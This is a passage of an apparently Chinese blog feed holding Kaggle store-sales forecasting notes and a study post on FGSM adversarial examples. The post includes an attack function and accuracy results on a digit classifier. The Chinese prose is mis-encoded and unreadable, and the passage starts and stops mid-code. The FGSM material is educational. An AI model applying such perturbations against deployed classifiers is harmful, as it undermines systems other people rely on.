class="literal">True</span>)</span><br><span class="line">        y_bis =y_bis.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">        y_bis = y_bis.reset_index()</span><br><span class="line"></span><br><span class="line">        y_resid = y_bis[<span class="string">&#x27;sales&#x27;</span>] - y_fit[<span class="string">&#x27;sales&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.model_2.fit(X_2, y_resid)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Save column names for predict method</span></span><br><span class="line">        self.y_columns = y.columns</span><br><span class="line">        <span class="comment"># Save data for question checking</span></span><br><span class="line">        self.y_fit = y_fit</span><br><span class="line">        self.y_resid = y_resid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, X_test_1</span>):</span><br><span class="line"></span><br><span class="line">        y_submit = pd.DataFrame(self.model_1.predict(X_test_1), index=X_test_1.index, columns=y.columns)</span><br><span class="line">        y_submit = y_submit.stack()</span><br><span class="line">        y_submit = y_submit.stack()</span><br><span class="line">        X_test_2 = y_submit</span><br><span class="line">        X_test_2 = X_test_2.reset_index([<span class="string">&#x27;family&#x27;</span>,<span class="string">&#x27;store_nbr&#x27;</span>])</span><br><span class="line">        X_test_2[<span class="string">&#x27;day&#x27;</span>] = X_test_2.index.dayofweek</span><br><span class="line">        X_test_2 = X_test_2.drop(<span class="string">&#x27;sales&#x27;</span>,axis =<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> colname <span class="keyword">in</span> X_test_2.select_dtypes([<span class="string">&quot;object&quot;</span>, <span class="string">&quot;category&quot;</span>]):</span><br><span class="line">            X_test_2[colname], _ = X_test_2[colname].factorize()</span><br><span class="line">        y_test = self.model_2.predict(X_test_2) + y_submit[<span class="string">&#x27;sales&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        y_test = y_test.reset_index()</span><br><span class="line">        y_test = y_test.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>]).sort_index()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> y_test  <span class="comment"># long to wide</span></span><br></pre></td></tr></table></figure></p><p>å®šä¹‰ç»“æŸäº†åç»­å¡«å……æ¨¡å‹å³å¯ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Fit the model</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Model 1 (trend)</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet, Lasso, Ridge</span><br><span class="line"></span><br><span class="line"><span class="comment"># Model 2 (residuals)</span></span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> ExtraTreesRegressor, RandomForestRegressor, GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.neural_network <span class="keyword">import</span> MLPRegressor</span><br><span class="line"></span><br><span class="line">model_hybrid = BoostedHybrid(</span><br><span class="line">    Ridge(),</span><br><span class="line">    RandomForestRegressor()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">model_hybrid.fit(y,X_1,X_2)</span><br></pre></td></tr></table></figure></p><p>æœ€åå¯¹submissionçš„å¤„ç†è¿›è¡Œå¤„ç†å¹¶ä¸¢è¿›æ¨¡å‹é¢„æµ‹,è¾“å‡ºå­˜submission <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Preparing data for submission</span></span><br><span class="line"></span><br><span class="line">df_test = pd.read_csv(</span><br><span class="line">    <span class="string">&#x27;/kaggle/input/store-sales-time-series-forecasting/test.csv&#x27;</span>,</span><br><span class="line">    dtype=&#123;</span><br><span class="line">        <span class="string">&#x27;store_nbr&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;family&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;onpromotion&#x27;</span>: <span class="string">&#x27;uint32&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">df_test[<span class="string">&#x27;date&#x27;</span>] = df_test.date.dt.to_period(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">df_test = df_test.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>]).sort_index()</span><br><span class="line">X_test_1 = dp.out_of_sample(steps=<span class="number">16</span>)</span><br><span class="line">X_test_1.index.name = <span class="string">&#x27;date&#x27;</span></span><br><span class="line">X_test_1[<span class="string">&#x27;NewYear&#x27;</span>] = (X_test_1.index.dayofyear == <span class="number">1</span>)</span><br><span class="line">sub = model_hybrid.predict(X_test_1).clip(<span class="number">0.0</span>)</span><br><span class="line">sub = sub.join(df_test.<span class="built_in">id</span>).reindex(columns=[<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>])</span><br><span class="line">sub.to_csv(<span class="string">&#x27;submission.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹æŠ—æ ·æœ¬æ”»å‡»ç®€å•å­¦ä¹ </title>
      <link href="/2024/04/08/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/08/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å¾ˆä¹…ä»¥å‰å°±å¬è¯´è¿‡å¯¹æŠ—æ ·æœ¬æ”»å‡»,æœ€è¿‘çœ‹Diffusion Modelçš„æ—¶å€™ä¹Ÿæ³¨æ„åˆ°äº†GANç›¸å…³,æ‰€ä»¥è¿™é‡Œå¯¹å¯¹æŠ—æ ·æœ¬æ”»å‡»åšä¸€ä¸ªç®€å•è®°å½•.</p><p>å…ˆç®€çŸ­å†™ä¸€ä»½FGSM,å†™å®Œä¹‹åæ‰å‘ç°æœ‰ä¸€ä¸ªå«<a href="https://aisafety.readthedocs.io/zh-cn/latest/Start/index.html">AISafety</a>çš„å¹³å°,åç»­å‡†å¤‡å†åœ¨è¿™ä¸ªå¹³å°ä¸Šé¢ç ”ç©¶ä¸€ä¸‹.</p><h2 id="fgsm">FGSM</h2><p>é¦–å…ˆtorchå®˜æ–¹ä¹Ÿç»™å‡ºäº†å¯¹æŠ—æ ·æœ¬ç›¸å…³poc,å¯ä»¥ç›´æ¥è¿›è¡Œå‚è€ƒ. <a href="https://pytorch.org/tutorials/beginner/fgsm_tutorial.html">FGSM</a>.</p><p>å…³äºFGSM,é¦–å…ˆè‚¯å®šæ˜¯æœ€æœ‰åçš„ç†ŠçŒ«å›¾äº† <img src="panda.png" alt="panda" /></p><p>ä»torchå®˜ç½‘ç»™å‡ºçš„ä¾‹å­æ¥çœ‹,FGSMæ˜¯åœ¨çŸ¥é“æ¨¡å‹å‚æ•°æƒ…å†µä¸‹çš„ç™½ç›’æ”»å‡». æ€è·¯ä¸»è¦æ˜¯é€šè¿‡æ±‚lossfunctionå¯¹xçš„æ¢¯åº¦,å¯¹xå¾€æœ€å¤§åŒ–lossçš„æ–¹å‘è¿›è¡Œç§»åŠ¨,åŒæ—¶åšå‡ºå¯¹epsilonçš„ä¸Šé™é™åˆ¶ä»¥åŠrangeçš„clip.</p><p>è¯´æ¸…æ¥šäº†ä¹‹åå…¶å®å°±æ˜¯ä¸Šé¢è¿™ä¸€å¥è¯, ç„¶åè¿™é‡Œè´´ä¸€ä¸ªgithubä¸Šé¢æ‰¾åˆ°çš„å¦ä¸€ä¸ªfgsm_attackçš„ä¸»è¦å‡½æ•°æ–¹ä¾¿åˆ†æ. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/Harry24k/FGSM-pytorch/blob/master/FGSM.ipynb</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fgsm_attack</span>(<span class="params">model, loss, images, labels, eps</span>) :</span><br><span class="line">    </span><br><span class="line">    images = images.to(device)</span><br><span class="line">    labels = labels.to(device)</span><br><span class="line">    images.requires_grad = <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">    outputs = model(images)</span><br><span class="line">    </span><br><span class="line">    model.zero_grad()</span><br><span class="line">    cost = loss(outputs, labels).to(device)</span><br><span class="line">    cost.backward()</span><br><span class="line">    attack_images = images + eps * images.grad.sign()</span><br><span class="line">    attack_images = torch.clamp(attack_images, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> attack_images</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>åç»­è‡ªå·±è·‘å›kaggleå¤ç”¨äº†ä¸€ä¸‹digit-recognizer,å¹¶ä¸”å¯¹æ·»åŠ å™ªéŸ³ä¹‹åçš„å›¾è¿›è¡Œäº†è¾“å‡ºæŸ¥çœ‹.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_images</span>(<span class="params">datset, num_samples=<span class="number">20</span>, cols=<span class="number">5</span>, label=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Plots some samples from the dataset &quot;&quot;&quot;</span></span><br><span class="line">    plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>)) </span><br><span class="line">    <span class="keyword">for</span> i, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(datset):</span><br><span class="line">        <span class="keyword">if</span> i == num_samples:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ax = plt.subplot(<span class="built_in">int</span>(num_samples/cols) + <span class="number">1</span>, cols, i + <span class="number">1</span>)</span><br><span class="line">        ax.set_title(label[i])</span><br><span class="line">        plt.imshow(img[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">epsilons = [<span class="number">0</span>, <span class="number">.05</span>, <span class="number">.1</span>, <span class="number">.15</span>, <span class="number">.2</span>, <span class="number">.25</span>, <span class="number">.3</span>]</span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(train_x, train_y, test_size=<span class="number">0.2</span>)</span><br><span class="line">dataset = TensorDataset(x_train, y_train)</span><br><span class="line">train_iter = DataLoader(dataset, batch_size=batch_size, shuffle=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Run test for each epsilon</span></span><br><span class="line"><span class="keyword">for</span> eps <span class="keyword">in</span> epsilons:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Epsilon: <span class="subst">&#123;eps&#125;</span>&quot;</span>)</span><br><span class="line">    correct_before = <span class="number">0</span></span><br><span class="line">    correct_after = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> train_iter:</span><br><span class="line">        x = torch.clamp(x, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        fgsm_x = fgsm_attack(model, loss, x, y.long(), eps)</span><br><span class="line">        y_pred = model(x).argmax(axis=<span class="number">1</span>)</span><br><span class="line">        total += <span class="built_in">len</span>(y)</span><br><span class="line">        correct_before += <span class="built_in">sum</span>(y_pred == y)</span><br><span class="line">        y_pred_after = model(fgsm_x).argmax(axis=<span class="number">1</span>)</span><br><span class="line">        correct_after += <span class="built_in">sum</span>(y_pred_after == y)</span><br><span class="line">        last_x = x</span><br><span class="line">        </span><br><span class="line">        last_y_before = y_pred</span><br><span class="line">        last_y_after = y_pred_after</span><br><span class="line">        </span><br><span class="line">    show_images(last_x[:<span class="number">5</span>].detach().cpu(), num_samples=<span class="number">5</span>, cols=<span class="number">5</span>, label=last_y_before[:<span class="number">5</span>])</span><br><span class="line">    show_images(fgsm_x[:<span class="number">5</span>].detach().cpu(), num_samples=<span class="number">5</span>, cols=<span class="number">5</span>, label=last_y_after[:<span class="number">5</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;before attack: <span class="subst">&#123;correct_before/total&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;after attack: <span class="subst">&#123;correct_after/total&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># Epsilon: 0</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># Epsilon: 0.05</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.9459821581840515</span></span><br><span class="line"><span class="comment"># Epsilon: 0.1</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.8537499904632568</span></span><br><span class="line"><span class="comment"># Epsilon: 0.15</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.6502678394317627</span></span><br><span class="line"><span class="comment"># Epsilon: 0.2</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.3650892674922943</span></span><br><span class="line"><span class="comment"># Epsilon: 0.25</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.14562499523162842</span></span><br><span class="line"><span class="comment"># Epsilon: 0.3</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.04541666433215141</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸€å¼€å§‹æˆ‘è‡ªå·±å¹¶æ²¡æœ‰åšclip,å¯¼è‡´FGSMå³ä½¿epsilonè®¾ç½®0ä¹Ÿä¼šå¯¼è‡´æ€§èƒ½å·¨å¹…ä¸‹é™,åç»­åœ¨trainé‡Œé¢å¸¦ä¸Šäº†clipå¹¶ä¸”å¯¹æ¨¡æ‹Ÿæ”»å‡»éƒ¨åˆ†ä¹Ÿå¸¦ä¸Šäº†ç›¸åº”å¤„ç†,é¡ºåˆ©è§£å†³. è¿™é‡Œepsilonä¸º0æ—¶ä¸¤è€…æ€§èƒ½æ¥è¿‘,è€Œéšç€epsilonçš„å¢å¤§æ¨¡å‹æ€§èƒ½å¼€å§‹ä¸‹é™,é€šè¿‡åé¢å›¾ç‰‡çš„è¾“å‡ºå‘ç°å…¶å®ä¸»è¦éƒ¨åˆ†è¿˜æ˜¯ä¸å˜çš„, ä¸è¿‡é¢œè‰²çš„å¤„ç†åº”è¯¥è¿˜æ˜¯æœ‰ä¸€äº›é—®é¢˜, å…¶å®ä»”ç»†ä¸€çœ‹å·®åˆ«è¿˜æ˜¯è›®å¤§çš„. <img src="epsilon_img.png" alt="epsilon" /></p><p>å¹¶ä¸”ç›®å‰CVæ–¹å‘çš„æ¨¡å‹è¿˜å¤„ç†çš„ä¸æ˜¯å¾ˆç†Ÿç»ƒ,ç°åº¦å¤„ç†ä¹‹ååº”è¯¥ä¼šå¥½ä¸€äº›æˆ–è€…è‡³å°‘èƒ½çœ‹å‡ºæ›´å¤šé—®é¢˜. æš‚æ—¶å…ˆå†™ä¸€ä¸ªFGSM,åç»­æœ‰ç©ºè¿˜ä¼šç»§ç»­çœ‹å…¶ä»–æ”»å‡»æ–¹æ³•.</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup3-TimeSeries</title>
      <link href="/2024/04/06/Kaggle-warmup3-TimeSeries/"/>
      <url>/2024/04/06/Kaggle-warmup3-TimeSeries/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©çœ‹å­¦ä¹ èµ„æ–™çš„æ—¶å€™å‘ç°kaggleè¿˜æœ‰æ—¶åºç›¸å…³çš„MLé—®é¢˜,æƒ³èµ·ä¹‹å‰çœ‹åˆ°æœ‰å…¬å¸ä¹Ÿæœ‰è¦æ±‚æ—¶åºå¤„ç†ç›¸å…³ç»éªŒ,è¿™é‡Œå°±ä»é›¶å¼€å§‹å­¦ä¹ ä¸€ä¸‹æ—¶åºå¤„ç†ç›¸å…³,å¯èƒ½ä¸€ç¯‡ä¸å¤ªå†™å¾—å®Œ,æ¯•ç«Ÿæ˜¯ä»¥å‰æ²¡åšè¿‡çš„ä¸œè¥¿,å¤§æ¦‚ä¼šå¤šå†™ä¸€äº›.</p><p>é¢˜ç›®æ˜¯<a href="https://www.kaggle.com/competitions/store-sales-time-series-forecasting">Store Sales - Time Series Forecasting</a></p><p>ç„¶åå­¦ä¹ çš„notebookæ˜¯æ¥è‡ª<a href="https://www.kaggle.com/code/amisha0528/store-sales-time-series-data-prediction/notebook">Amisha0528</a>è¿™ä½æœ‹å‹çš„,</p><h2 id="æ•°æ®è¯»å–å’Œåˆå¹¶">æ•°æ®è¯»å–å’Œåˆå¹¶</h2><p>é¦–å…ˆdatasetæä¾›çš„å†…å®¹åŒ…å«åœ¨å¤šä¸ªæ–‡ä»¶ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">train =pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/train.csv&quot;</span>)</span><br><span class="line">test=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/test.csv&quot;</span>)</span><br><span class="line">oil=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/oil.csv&quot;</span>)</span><br><span class="line">stores=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/stores.csv&quot;</span>)</span><br><span class="line">transactions=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/transactions.csv&quot;</span>)</span><br><span class="line">holidays=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/holidays_events.csv&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ•°æ®è®¾è®¡å¤šè¡¨åˆå¹¶,ä»¥å‰å¹¶æ²¡æœ‰ç¢°åˆ°è¿‡æ­¤ç±»é—®é¢˜åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">train[<span class="string">&#x27;test&#x27;</span>] = <span class="number">0</span></span><br><span class="line">test[<span class="string">&#x27;test&#x27;</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># concat è¿æ¥trainå’Œtest, ä¾é testå­—æ®µåšåŒºåˆ†</span></span><br><span class="line">data = pd.concat([train, test], axis=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># mergeåšè¡¨åˆå¹¶</span></span><br><span class="line">data = data.merge(holidays, on=<span class="string">&#x27;date&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">data= data.merge(stores, on=<span class="string">&#x27;store_nbr&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">data= data.merge(oil, on=<span class="string">&#x27;date&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">data= data.merge(transactions, on=[<span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;store_nbr&#x27;</span>], how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"><span class="comment"># set_indexæŒ‡å®šé€‰å–å“ªäº›ä½œä¸ºindex</span></span><br><span class="line">data = data.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;family&#x27;</span>])</span><br><span class="line">data = data.drop(index=<span class="string">&#x27;2013-01-01&#x27;</span>, level=<span class="number">1</span>)</span><br><span class="line">data</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ–°å¢testå­—æ®µåštrainå’Œtestçš„åŒºåˆ†,ç„¶åå¯¹trainå’Œtestè¿›è¡Œåˆå¹¶æ–¹ä¾¿åšè¡¨åˆå¹¶,æœ€åé€‰å–å¤šåˆ—åšindex <img src="data1_head.png" alt="head" /></p><p>åç»­ä½¿ç”¨pandasçš„datetimeè¿›è¡Œå¤„ç†,è¿™é‡Œå¯ä»¥ç›´æ¥å•ç‹¬æå–year, month, day, weekç­‰å­—æ®µä½œä¸ºå•ç‹¬åˆ—æ–¹ä¾¿åç»­å¤„ç† <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dateå¤„ç†</span></span><br><span class="line">data_ = data.copy().reset_index()</span><br><span class="line"></span><br><span class="line">data_[<span class="string">&#x27;date&#x27;</span>] = pd.to_datetime(data_[<span class="string">&quot;date&quot;</span>])</span><br><span class="line">data_[<span class="string">&#x27;day_of_week&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.day_of_week</span><br><span class="line">data_[<span class="string">&#x27;day_of_year&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.dayofyear</span><br><span class="line">data_[<span class="string">&#x27;day_of_month&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.day</span><br><span class="line">data_[<span class="string">&#x27;month&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.month</span><br><span class="line">data_[<span class="string">&#x27;quarter&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.quarter</span><br><span class="line">data_[<span class="string">&#x27;year&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.year</span><br><span class="line"></span><br><span class="line">train = data_[data_[<span class="string">&#x27;test&#x27;</span>] == <span class="number">0</span>]</span><br><span class="line">test = data_[data_[<span class="string">&#x27;test&#x27;</span>] == <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">train.head()</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå¯ä»¥groupbyçœ‹ä¸€ä¸‹å„ç§æ—¶é—´çš„salesæ•°æ®,å¯ä»¥åšä¸€äº›plotingä¹‹ç±»çš„å·¥ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># groupbyå¯¹saleæ±‚å’Œ</span></span><br><span class="line"><span class="comment"># groupbyå­¦ä¹ </span></span><br><span class="line">grouping_columns = [<span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;quarter&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;day_of_week&#x27;</span>, <span class="string">&#x27;day_of_year&#x27;</span>, <span class="string">&#x27;day_of_month&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind, column <span class="keyword">in</span> <span class="built_in">enumerate</span>(grouping_columns):</span><br><span class="line">    grouped_data = train.groupby(column)[<span class="string">&#x27;sales&#x27;</span>].<span class="built_in">sum</span>()</span><br><span class="line">    grouped_data = pd.DataFrame(grouped_data).reset_index()</span><br></pre></td></tr></table></figure><h2 id="åˆ›å»ºlagå’Œwindow">åˆ›å»ºlagå’Œwindow</h2><p>è¿™é‡Œæˆ‘ä¸ªäººæ„Ÿè§‰æ˜¯å…³é”®éƒ¨åˆ†,é€šè¿‡å‰é¢æå–çš„dateä¿¡æ¯,è¿™é‡Œæˆ‘ä»¬é€šè¿‡å»ºç«‹dateä¹‹é—´çš„å…³ç³»å¹¶æå–ä½œä¸ºæ–°çš„åˆ—,è¿™äº›åˆ—ä¼šåœ¨åç»­ä½œä¸ºfeatureä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shifting data</span></span><br><span class="line">alphas = [<span class="number">0.95</span>, <span class="number">0.8</span>, <span class="number">0.65</span>, <span class="number">0.5</span>]</span><br><span class="line">lags =[<span class="number">1</span>,<span class="number">7</span>,<span class="number">30</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># lagè¡¨delay,alphaè¡¨åŒæ—¶è¢«è€ƒè™‘çš„çª—å£</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lags:</span><br><span class="line">        data_[<span class="string">f&#x27;sales_lag_<span class="subst">&#123;i&#125;</span>_alpha_<span class="subst">&#123;a&#125;</span>&#x27;</span>] = np.log1p(grouped_data[<span class="string">&#x27;sales&#x27;</span>].transform(<span class="keyword">lambda</span> x: x.shift(i).ewm(alpha=a, min_periods=<span class="number">1</span>).mean()))</span><br><span class="line"></span><br><span class="line">data_[<span class="string">&#x27;sales_lag_7_alpha_0.5&#x27;</span>].describe()</span><br></pre></td></tr></table></figure><p>shiftæ˜¯åˆ›å»ºlag,ewmæ˜¯é€‰æ‹©çª—å£,è¡¨ç¤ºæ¯ä¸ªæ•°å€¼ç”±ç›¸è¿‘çš„å¤šå°‘ä¸ªå€¼æ‰€å†³å®š.</p><h2 id="æœ€åæ•°æ®æå–å’Œåˆ—çš„å–èˆ">æœ€åæ•°æ®æå–å’Œåˆ—çš„å–èˆ</h2><p>åç»­å³åštrain_test_splitå¹¶ä¸”ä¸¢å¼ƒä¸€äº›åˆ—,è¿™é‡Œä½œè€…è¿˜æ¶‰åŠäº†ä¸€äº›dummyç›¸å…³ä½†æœ€åä¼¼ä¹å¹¶æ²¡æœ‰åšç›¸åº”å¤„ç† <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 